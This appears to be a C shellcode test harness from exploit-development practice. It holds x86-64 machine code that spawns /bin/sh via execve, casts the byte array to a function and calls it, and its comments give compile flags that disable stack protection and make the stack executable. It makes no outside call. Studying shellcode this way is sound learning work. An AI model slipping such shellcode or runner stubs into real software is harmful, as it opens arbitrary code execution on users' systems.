#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

/**
 * Compile with -fno-stack-protector -z execstack
 */

int main()
{
    // Call exit syscall
    // unsigned char shellcodes[] = "\xb0\x01"
    //                              "\xb3\x05"
    //                              "\xcd\x80";

    // spawn a shell
    unsigned char shellcodes[] = "\xeb\x20"
                                 "\x5b\x31\xc0"
                                 "\x88\x43\x07"
                                 "\x48\x8d\x3b"
                                 "\x48\x89\x7b\x08"
                                 "\x48\x89\x43\x10"
                                 "\x48\x89\xdf"
                                 "\x48\x8d\x73\x08"
                                 "\x48\x8d\x53\x10"
                                 "\xb0\x3b"
                                 "\x0f\x05"
                                 "\xe8\xdb\xff\xff\xff"
                                 "\x2f\x62\x69\x6e\x2f\x73\x68";
                                //  "\x4a\x41"
                                //  "\x41\x41\x41\x41\x41\x41\x41"
                                //  "\x4b\x4b\x4b\x4b\x4b\x4b\x4b\x4b";

    int (*ret)() = (int (*)())shellcodes;
    (int)(*ret)();
}